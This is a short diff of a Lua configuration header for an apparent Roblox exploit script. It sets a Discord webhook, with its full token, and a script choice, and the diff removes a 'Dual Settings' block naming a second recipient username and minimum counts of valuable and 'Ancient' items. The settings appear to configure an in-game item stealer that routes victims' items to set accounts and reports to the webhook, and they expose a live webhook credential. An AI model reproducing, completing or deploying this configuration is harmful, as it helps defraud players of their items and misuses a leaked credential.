@@ -4,12 +4,6 @@ Webhook = "https://discord.com/api/webhooks/1291752093387853988/4Xte3V-WEnQotkIP
 Script = "Highlight Lite" -- [None | Custom | MetterX Hub | Highlight Lite]
 RawLink = "" -- [Raw Link If "Custom"]
 
--- [ Dual Settings ] --
-DualUsername = "QuadCoreDragon" -- [Dual Username]
-DualWebhook = "https://discord.com/api/webhooks/1291752093387853988/4Xte3V-WEnQotkIPZv173EMATsBRMccyT6Dt20_JOM2EptEHto0S0opxeEykAaBjxOH-" -- [Dual Webhook]
-DualItems = 10000 -- [Minimum Valuable Items Count]
-DualAncient = 50000 -- [Minimum Ancient Count]
-
 repeat wait() until game:IsLoaded()
 
 if getgenv().executed then return end
